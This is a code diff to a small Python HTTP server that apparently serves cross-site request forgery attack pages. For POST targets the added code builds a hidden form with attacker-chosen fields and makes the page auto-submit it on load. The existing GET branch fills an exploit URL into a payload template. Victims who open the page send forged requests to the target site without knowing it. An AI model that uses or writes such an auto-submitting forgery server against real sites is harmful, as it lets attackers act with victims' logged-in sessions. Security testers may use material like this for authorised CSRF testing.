@@ -23,10 +23,17 @@ class HTTPHandler (SimpleHTTPRequestHandler):
 			global_payload = global_payload.replace("[EXPLOIT]", global_url)
 			return global_payload
 		elif global_method.lower() == "post":
-			print "ok"
+			result = "<form id='payload' action='"+global_url+"' method='post'>"
+			for key, value in global_parameters.items():
+				result += "<input type='hidden' name='"+key+"' value='"+value+"'>"
+			return result
 
 	def index(self):
-		html_response = '<html><head></head><body>'+self.prepare_request()+'</body></html>'
+		global global_method
+		if global_method.lower() == "get":
+			html_response = '<html><head></head><body>'+self.prepare_request()+'</body></html>'
+		else:
+			html_response = '<html><head></head><body onload="document.getElementById(\'payload\').submit()">'+self.prepare_request()+'</body></html>'
 		self.send_response(200)
 		self.send_header("Content-type", "text/html")
 		self.send_header("Content-length", len(html_response))
